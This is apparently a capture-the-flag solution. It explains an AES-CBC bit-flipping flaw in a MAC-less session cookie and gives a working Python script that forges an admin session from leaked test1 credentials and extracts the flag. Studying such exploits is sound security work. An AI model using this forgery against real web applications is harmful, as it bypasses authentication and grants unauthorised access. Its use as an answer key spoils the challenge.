Vulnerability: AES-CBC bit-flipping with no MAC. The `session` cookie is
`hex(IV || AES-CBC-ciphertext)` of the username, and the IV is attacker-visible in
the cookie. Since `P1 = D(C1) XOR IV`, XOR-ing the IV with `"test1" XOR "admin"`
turns a `test1` session into an `admin` session without the key. Credentials
`test1`/`test1` are leaked in an HTML comment.

1. **Log in as `test1`/`test1`, bit-flip the IV, and replay to `/welcome`** (the
   IV is random per login, so capture it live):

   ```python
   import re, requests
   base = "http://<target>"
   issued = requests.post(f"{base}/login", data={"username":"test1","password":"test1"},
                          allow_redirects=False).cookies["session"]
   data = bytes.fromhex(issued)
   iv, ct = bytearray(data[:16]), data[16:]
   for i,(p,t) in enumerate(zip(b"test1", b"admin")):
       iv[i] ^= p ^ t
   forged = (bytes(iv)+ct).hex()
   body = requests.get(f"{base}/welcome", cookies={"session": forged}).text
   print(re.search(r"FLAG\{[a-f0-9]+\}", body).group(0))
   ```

2. **Report the flag** (`FLAG{...}`) verbatim.
